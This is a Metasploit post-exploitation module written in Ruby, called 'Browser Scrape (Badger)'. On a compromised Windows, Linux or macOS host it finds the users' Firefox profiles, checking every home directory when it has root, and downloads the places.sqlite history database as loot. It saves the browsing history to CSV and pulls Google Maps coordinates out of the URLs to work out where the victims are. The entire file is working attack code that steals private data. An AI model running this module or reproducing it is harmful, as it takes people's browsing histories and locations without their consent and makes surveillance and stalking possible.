require 'msf/core'
require 'msf/core/post/file'
require 'msf/core/post/common'
require 'msf/core/post/windows/user_profiles'
require 'msf/core/post/osx/system'
require 'rex'
require 'csv'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::Windows::UserProfiles
	include Msf::Post::OSX::System
    include Msf::Auxiliary::Badger_Report

	
	def initialize(info={})
		super( update_info( info,
			'Name'		=> 'Browser Scrape (Badger)',
			'Description'	=> %q{
			This module can be used to search through a web browser
			history for geolocation artifacts.
			},
			'License'	=> MSF_LICENSE,
			'Author'	=> ['v10l3nt'],
				'Platform'      => [ 'unix', 'bsd', 'linux', 'osx', 'windows'],
				'SessionTypes'  => [ 'meterpreter', 'shell' ]
			))
	end

	def run
		begin
			require 'sqlite3'
			rescue LoadError
			print_error("Failed to load sqlite3, try 'gem install sqlite3'")
			return
		end    
		paths = []
		print_status("Determining session platform and type...")
		case session.platform
				when /unix|linux|bsd/
			@platform = :unix
			paths = enum_users_unix
				when /osx/
			@platform = :osx
			paths = enum_users_unix
				when /win/
			if session.type != "meterpreter"
				print_error "Only meterpreter sessions are supported on windows hosts"
				return
			end            
			grab_user_profiles().each do |user|
				next if user['AppData'] == nil
				dir = check_firefox(user['AppData'])
				if dir
					paths << dir
				end
			end
				else
			print_error("Unsupported platform #{session.platform}")
			return
		end
		if paths.nil?
			print_error("No users found with a Firefox directory")
			return
		end
		paths.each do |path|
			db_path = download_loot(path)
			process_db(db_path)
		end
	end    
	
	def enum_users_unix
		id = whoami
		if id.nil? or id.empty?
			print_error("This session is not responding, perhaps the session is dead")
		end        
		if @platform == :osx
			home = "/Users/"
		else
			home = "/home/"
		end        
		if got_root?
			userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
			userdirs << "/root\n"
		else
			print_status("We do not have root privileges")
			print_status("Checking #{id} account for Firefox")
			if @platform == :osx
				firefox = session.shell_command("ls #{home}#{id}/Library/Application\\ Support/Firefox/Profiles/").gsub(/\s/, "\n")
			else
				firefox = session.shell_command("ls #{home}#{id}/.mozilla/firefox/").gsub(/\s/, "\n")
			end
			firefox.each_line do |profile|
				profile.chomp!
				next if profile =~ /No such file/i
				if profile =~ /\.default/
				print_status("Found Firefox Profile for: #{id}")
				if @platform == :osx
					return [home + id + "/Library/Application\\ Support/Firefox/Profiles/" + profile + "/"]
				else
					return [home + id + "/.mozilla/" + "firefox/" + profile + "/"]
				end
				end
			end
			return
		end        
		# we got root check all user dirs
		paths = []
		userdirs.each_line do |dir|
			dir.chomp!
			next if dir == "." || dir == ".."
			dir = home + dir + "/.mozilla/firefox/" if dir !~ /root/
			if dir =~ /root/
				dir += "/.mozilla/firefox/"
			end
			print_status("Checking for Firefox Profile in: #{dir}")
			stat = session.shell_command("ls #{dir}")
			if stat =~ /No such file/i
				print_error("Mozilla not found in #{dir}")
				next
			end
			stat.gsub!(/\s/, "\n")
			stat.each_line do |profile|
				profile.chomp!
				if profile =~ /\.default/
					print_status("Found Firefox Profile in: #{dir+profile}")
					paths << "#{dir+profile}"
				end
			end
		end
		return paths
	end

	def check_firefox(path)
		paths = []
		path = path + "\\Mozilla\\"
		print_status("Checking for Firefox directory in: #{path}")
		stat = session.fs.file.stat(path + "Firefox\\profiles.ini") rescue nil
		if !stat
			print_error("Firefox not found")
			return
		end        
		session.fs.dir.foreach(path) do |fdir|
			if fdir =~ /Firefox/i and @platform == :windows
				paths << path + fdir + "Profiles\\"
				print_good("Found Firefox installed")
				break
			else
				paths << path + fdir
				print_status("Found Firefox installed")
				break
			end
		end
		if paths.empty?
			print_error("Firefox not found")
			return
		end
		print_status("Locating Firefox Profiles...")
		print_line("")
		path += "Firefox\\Profiles\\"
		begin
			session.fs.dir.foreach(path) do |pdirs|
				next if pdirs == "." or pdirs == ".."
				print_good("Found Profile #{pdirs}")
				paths << path + pdirs
			end
			rescue
				print_error("Profiles directory missing")
				return
			end
		if paths.empty?
			return nil
		else
			return paths
		end
	end

	def download_loot(path)
			print_status(path)
			profile = path.scan(/Profiles[\\|\/](.+)$/).flatten[0].to_s
			if session.type == "meterpreter"
				file="places.sqlite"
				print_good("Downloading #{file} file from: #{path}")
				file = path + "\\" + file
				fd = session.fs.file.new(file)
				begin
					until fd.eof?
					data = fd.read
					loot << data if not data.nil?
					end
					rescue EOFError
					ensure
					fd.close
				end
				file = file.split('\\').last
				file_loc = store_loot("ff.profile.places.sqlite", "binary/db", session, loot, "places.sqlite", "Firefox history for #{profile}")
			end
			if session.type != "meterpreter"
				file="places.sqlite"
				print_good("Downloading #{file}\\")
				data = session.shell_command("cat #{path}#{file}")
				file = file.split('/').last
				file_loc = store_loot("ff.profile.places.sqlite", "binary/db", session, data, "places.sqlite", "Firefox history for #{profile}")
			end
			return file_loc
	end

    def parse_googlemaps(url)
        if url =~ /([=-|=][0-9]+\.[0-9]+\%2C)/i
            lat=$1.sub("=","").sub("%2C","")
            if url =~/(\%2C[-]*[0-9]+\.[0-9]+)/i
                lon=$1.sub("%2C","")
                acc=1.0
                print_status("Found Google Map: Lat=#{lat}, Lon=#{lon}")
                pos = Position.new(lat,lon,acc)
                comment = "#{url}"
                enc_comment = Rex::Text.encode_base64(comment)
                report_cresults(pos,"msf_browserscrape",enc_comment)
            end
        end
    end
    
	def process_db(db_path)
		db = SQLite3::Database.new(db_path)
		user_rows = db.execute2('select url from moz_places;;')
		print_status("Enumerating Firefox history")
		if user_rows.length > 1
			user_info = store_loot("firefox.history",
			"text/plain", session, "", "Firefox history.")
			print_good("Saving firefox history")
			urls=save_csv(user_rows,user_info)
            urls.each do |url|
                if url =~ /(maps.google.com\/maps\?ll=)/i
                    parse_googlemaps(url)
                end 
                #print url
            end
		end
	end

	def save_csv(data,file)
        urls = []
		CSV.open(file, "w") do |csvwriter|
			data.each do |record|
                urls << record[0]
				csvwriter << record
			end
		end
        return urls
	end

	def got_root?
		case @platform
			when :windows
				if session.sys.config.getuid =~ /SYSTEM/
				return true
				else
				return false
				end
			else 
				ret = whoami
				if ret =~ /root/
				return true
				else
				return false
			end
		end
	end

	def whoami
		if @platform == :windows
			return session.fs.file.expand_path("%USERNAME%")
		else
			return session.shell_command("whoami").chomp
		end
	end
end
